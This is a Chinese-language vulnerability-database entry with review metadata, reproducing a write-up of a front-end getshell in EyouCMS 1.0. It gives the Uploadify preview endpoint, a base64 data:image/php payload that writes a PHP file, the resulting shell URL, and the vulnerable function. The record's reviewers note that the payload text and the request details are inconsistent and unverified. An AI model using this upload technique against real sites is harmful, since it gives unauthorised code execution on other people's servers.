---
source: "hatch 补库批 20260928"
product: "EyouCMS1.0 Uploadify.preview"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Eyoucms 1.0 前台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：前台preview接口可用，PHP目录执行；具体POST字段未转录"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-25966c0763b729e1e36448a8"
entity_id: "ve-25966c0763b729e1e36448a8"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：前台preview接口可用，PHP目录执行；具体POST字段未转录

- **证据待核（1）**：文本构造phpinfo缺括号，与base64解码内容不同；POST只列值不列参数名/Content-Type。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（2）**：说明与原理全图，作者故意后门猜测无证据不应纳元数据；无修复范围。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Eyoucms 1.0 前台getshell

一、漏洞简介
------------

官网：http://www.eyoucms.com/download/Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip

二、漏洞影响
------------

三、复现过程
------------

老样子：先讲如何利用

    url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview

    构造: <?php phpinfo;

![](./.resource/Eyoucms1.0前台getshell/media/rId24.png)

    post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==

![](./.resource/Eyoucms1.0前台getshell/media/rId25.png)

Shell:
http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php

![](./.resource/Eyoucms1.0前台getshell/media/rId26.png)

![](./.resource/Eyoucms1.0前台getshell/media/rId27.png)

### 原理分析

漏洞文件： eyoucms1.0\\application\\api\\controller\\Uploadify.php漏洞函数：preview()

![](./.resource/Eyoucms1.0前台getshell/media/rId29.png)

![](./.resource/Eyoucms1.0前台getshell/media/rId30.png)

这里我将每行有意义的代码都解释了一下帮助读者进行查看。

而我刚开始时也思考了一下，这会不会是作者故意搞的后门？带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的
表示data:image/ 居然还可以不是图片？好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/
只能是图片。

四、参考链接
------------

> https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh
